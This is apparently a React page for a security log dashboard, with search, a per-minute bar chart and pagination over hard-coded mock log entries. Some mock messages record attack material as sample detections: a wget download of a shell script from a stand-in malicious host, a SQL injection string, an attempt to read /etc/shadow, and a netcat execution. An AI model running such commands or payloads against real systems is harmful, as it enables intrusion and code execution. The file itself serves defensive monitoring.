import { useState, useEffect } from "react";
import { useContext } from 'react'; import { FontContext } from '../context/FontContext';
import Sidebar from "../components/sidebar";
import { Search, Filter, Download } from "lucide-react";
import {
    ResponsiveContainer,
    BarChart,
    Bar,
    XAxis,
    YAxis,
    Tooltip,
} from "recharts";
import { LanguageContext } from '@/context/LanguageContext';

export default function Logs() {
    const [logs, setLogs] = useState([]);
    const [filteredLogs, setFilteredLogs] = useState([]);
    const [searchQuery, setSearchQuery] = useState("");
    const [currentPage, setCurrentPage] = useState(1);
    const logsPerPage = 10;
    const { useOpenDyslexic } = useContext(FontContext);
    const { language } = useContext(LanguageContext);

    const [uiText, setUiText] = useState({
        searchLogs: "Search logs...",
        filter: "Filter",
        exportLogs: "Export Logs",
        chartTitle: "Log Entries Over Time",
        timestamp: "Timestamp",
        source: "Source",
        host: "Host",
        message: "Message",
        noLogsFound: "No logs found.",
        previous: "Previous",
        next: "Next",
        pageOf: "Page {current} of {total}",
      });
      
      useEffect(() => {
        const translateUIText = async () => {
            if (language === 'en') return;

            const keys = Object.keys(uiText);
            const values = Object.values(uiText);

            try {
                const response = await fetch('/api/translate', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ text: values, targetLanguage: language }),
                });

                const data = await response.json();
                if (data.translations) {
                    const translated = {};
                    keys.forEach((key, idx) => {
                        translated[key] = data.translations[idx].translatedText;
                    });
                    setUiText(translated);
                }
            } catch (err) {
                console.error('Translation error:', err);
            }
        };

        translateUIText();
    }, [language]);

    // Fetch log data (Replace with API call)
    useEffect(() => {
        const fetchLogs = async () => {
            const mockLogs = [
                {
                    id: "1",
                    timestamp: "2025-03-19T04:50:39Z",
                    source: "mysqld",
                    host: "db-server-01",
                    message: "Access denied for user 'admin'@'192.168.1.13' (using password: YES)"
                },
                {
                    id: "2",
                    timestamp: "2025-03-19T04:52:10Z",
                    source: "firewall",
                    host: "edge-router",
                    message: "Blocked incoming connection from 185.12.89.22 to port 22"
                },
                {
                    id: "3",
                    timestamp: "2025-03-19T04:55:22Z",
                    source: "auth",
                    host: "ubuntu-bionic",
                    message: "Failed password for invalid user root from 91.204.100.25 port 50122 ssh2"
                },
                {
                    id: "4",
                    timestamp: "2025-03-19T05:01:00Z",
                    source: "syslog",
                    host: "honeypot-node-2",
                    message: "Suspicious bash command detected: wget http://malicious.site/shell.sh"
                },
                {
                    id: "5",
                    timestamp: "2025-03-19T05:03:15Z",
                    source: "nginx",
                    host: "web-server-01",
                    message: "GET /login.php?id=' OR '1'='1 HTTP/1.1 - 403 Forbidden - Possible SQL Injection"
                },
                {
                    id: "6",
                    timestamp: "2025-03-19T05:04:59Z",
                    source: "cron",
                    host: "internal-api",
                    message: "Cron job '/usr/bin/python3 /opt/scripts/check_integrity.py' completed successfully"
                },
                {
                    id: "7",
                    timestamp: "2025-03-19T05:07:31Z",
                    source: "auth",
                    host: "honeypot-node-3",
                    message: "Accepted publickey for user 'analyst' from 10.0.2.15 port 45210 ssh2"
                },
                {
                    id: "8",
                    timestamp: "2025-03-19T05:09:12Z",
                    source: "nginx",
                    host: "web-server-01",
                    message: "POST /contact-form.php - Payload length exceeded 10KB - Blocked"
                },
                {
                    id: "9",
                    timestamp: "2025-03-19T05:12:20Z",
                    source: "firewall",
                    host: "edge-router",
                    message: "Multiple port scan attempts detected from 83.97.17.3"
                },
                {
                    id: "10",
                    timestamp: "2025-03-19T05:13:45Z",
                    source: "syslog",
                    host: "honeypot-node-2",
                    message: "Process '/bin/nc' executed with elevated privileges by unknown user"
                },
                {
                    id: "11",
                    timestamp: "2025-03-19T05:15:01Z",
                    source: "auth",
                    host: "ubuntu-bionic",
                    message: "User 'www-data' attempted to access restricted directory '/etc/shadow'"
                },
                {
                    id: "12",
                    timestamp: "2025-03-19T05:16:45Z",
                    source: "nginx",
                    host: "web-server-01",
                    message: "GET /admin/config.php - 401 Unauthorized"
                },
                {
                    id: "13",
                    timestamp: "2025-03-19T05:17:32Z",
                    source: "firewall",
                    host: "edge-router",
                    message: "Blocked outbound connection to known C2 domain: c2.badnet.xyz"
                },
                {
                    id: "14",
                    timestamp: "2025-03-19T05:19:10Z",
                    source: "mysqld",
                    host: "db-server-01",
                    message: "User 'backup' accessed table 'users' from IP 172.16.0.4"
                },
                {
                    id: "15",
                    timestamp: "2025-03-19T05:21:04Z",
                    source: "syslog",
                    host: "honeypot-node-1",
                    message: "Detected base64 encoded payload in POST to /upload"
                },
                {
                    id: "16",
                    timestamp: "2025-03-19T05:22:28Z",
                    source: "auth",
                    host: "honeypot-node-3",
                    message: "User 'guest' failed login 5 times - temporary lockout triggered"
                },
                {
                    id: "17",
                    timestamp: "2025-03-19T05:23:17Z",
                    source: "nginx",
                    host: "web-server-01",
                    message: "HEAD /wp-login.php - 404 Not Found - Possible bot probe"
                },
                {
                    id: "18",
                    timestamp: "2025-03-19T05:24:41Z",
                    source: "cron",
                    host: "internal-api",
                    message: "Scheduled cleanup of temp files completed - 117 files deleted"
                },
                {
                    id: "19",
                    timestamp: "2025-03-19T05:26:00Z",
                    source: "firewall",
                    host: "edge-router",
                    message: "Geo-IP block triggered for IP 202.108.0.1 (CN)"
                },
                {
                    id: "20",
                    timestamp: "2025-03-19T05:27:50Z",
                    source: "syslog",
                    host: "honeypot-node-2",
                    message: "Unusual outbound DNS request to unknown domain: uj3xg4.onion"
                }
            ];

            setLogs(mockLogs);
            setFilteredLogs(mockLogs);
        };

        fetchLogs();
    }, []);

    // Process Data for Bar Chart (Grouping logs by minute)
    const logsByTimestamp = logs.reduce((acc, log) => {
        const time = new Date(log.timestamp).toISOString().substring(11, 16); // Extract HH:MM
        acc[time] = (acc[time] || 0) + 1;
        return acc;
    }, {});

    const barChartData = Object.keys(logsByTimestamp).map((key) => ({
        time: key,
        count: logsByTimestamp[key],
    }));

    // Search Functionality
    useEffect(() => {
        const filtered = logs.filter((log) =>
            Object.values(log)
                .join(" ")
                .toLowerCase()
                .includes(searchQuery.toLowerCase())
        );
        setFilteredLogs(filtered);
        setCurrentPage(1);
    }, [searchQuery, logs]);

    // Page Logic
    const indexOfLastLog = currentPage * logsPerPage;
    const indexOfFirstLog = indexOfLastLog - logsPerPage;
    const currentLogs = filteredLogs.slice(indexOfFirstLog, indexOfLastLog);
    const totalPages = Math.ceil(filteredLogs.length / logsPerPage);    

    return (
        <div 
        style={{ fontFamily: useOpenDyslexic ? "'OpenDyslexic', sans-serif" : "Arial, sans-serif" }} 
        className="flex bg-gradient-to-br from-[#91d2ff] to-[#72b4ea] min-h-screen">
            <Sidebar />
            <div className="flex-1 ml-20 text-black transition-all duration-300 p-6">

                {/* Search & Filter Panel */}
                <div className="bg-white/40 backdrop-blur-lg shadow-md rounded-lg p-4 flex items-center justify-between">
                    <div className="flex items-center w-2/3 bg-gray-100 p-2 rounded-lg">
                        <Search size={20} className="text-gray-400" />
                        <input
                            type="text"
                            placeholder={uiText.searchLogs}
                            className="bg-transparent outline-none ml-2 w-full"
                            value={searchQuery}
                            onChange={(e) => setSearchQuery(e.target.value)}
                        />
                    </div>
                    <div className="flex space-x-4">
                        <button className="flex items-center bg-gray-200 px-3 py-2 rounded-md">
                            <Filter size={16} className="mr-2" /> {uiText.filter}
                        </button>
                        <button className="flex items-center bg-blue-500 text-white px-3 py-2 rounded-md">
                            <Download size={16} className="mr-2" /> {uiText.exportLogs}
                        </button>
                    </div>
                </div>

                {/* Bar Chart - Logs Per Timestamp */}
                <div className="bg-white/40 p-4 rounded-lg shadow-md mt-6">
                    <h2 className="text-lg font-bold">{uiText.chartTitle}</h2>
                    <ResponsiveContainer width="100%" height={150}>
                        <BarChart data={barChartData}>
                            <XAxis dataKey="time" />
                            <YAxis />
                            <Tooltip />
                            <Bar dataKey="count" fill="#0088FE" />
                        </BarChart>
                    </ResponsiveContainer>
                </div>

                {/* Logs Table */}
                <div className="bg-white/40 p-6 rounded-lg shadow-md mt-6 overflow-auto max-h-[65vh]">
                    <table className="w-full text-left border-collapse">
                        <thead>
                            <tr className="bg-gray-100/60">
                                <th className="p-2 border-b">{uiText.timestamp}</th>
                                <th className="p-2 border-b">{uiText.source}</th>
                                <th className="p-2 border-b">{uiText.host}</th>
                                <th className="p-2 border-b">{uiText.message}</th>
                            </tr>
                        </thead>
                        <tbody>
                            {currentLogs.length > 0 ? (
                                currentLogs.map((log) => (
                                    <tr key={log.id} className="border-b hover:bg-gray-50/40">
                                        <td className="p-2">{new Date(log.timestamp).toLocaleString()}</td>
                                        <td className="p-2">{log.source}</td>
                                        <td className="p-2">{log.host}</td>
                                        <td className="p-2">{log.message}</td>
                                    </tr>
                                ))
                            ) : (
                                <tr>
                                    <td colSpan="5" className="p-2 text-center">
                                        No logs found.
                                    </td>
                                </tr>
                            )}
                        </tbody>
                    </table>
                </div>

                {/* Pagination */}
                {totalPages > 1 && (
                    <div className="flex justify-center mt-4">
                        <button
                            className={`px-4 py-2 mx-1 rounded-md ${currentPage === 1 ? "bg-gray-300" : "bg-blue-500 text-white"}`}
                            onClick={() => setCurrentPage(currentPage - 1)}
                            disabled={currentPage === 1}
                        >
                            {uiText.previous}
                        </button>
                        <span className="px-4 py-2">
                            {uiText.pageOf.replace('{current}', currentPage).replace('{total}', totalPages)}
                        </span>
                       <button
                            className={`px-4 py-2 mx-1 rounded-md ${currentPage === totalPages ? "bg-gray-300" : "bg-blue-500 text-white"}`}
                            onClick={() => setCurrentPage(currentPage + 1)}
                            disabled={currentPage === totalPages}
                        >
                            {uiText.next}
                        </button>
                    </div>
                )}
            </div>
        </div>
    );
}